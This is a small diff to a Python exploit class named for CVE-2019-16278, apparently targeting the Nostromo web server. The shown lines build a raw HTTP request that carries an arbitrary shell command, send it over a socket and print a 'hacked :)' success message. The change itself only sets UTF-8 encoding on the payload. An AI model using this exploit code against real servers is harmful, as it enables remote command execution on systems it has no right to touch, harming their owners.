@@ -29,7 +29,7 @@ class CVE2019_16278:
         payload += "Content-Length: 1\r\n\r\necho\necho\n"
         payload += "%s 2>&1" % cmd
         print (LogColors.YELLOW + payload + LogColors.ENDC)
-        payload = payload.encode()
+        payload = payload.encode("utf-8")
         self.sock.sendall(payload)
         print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
         resp = ""
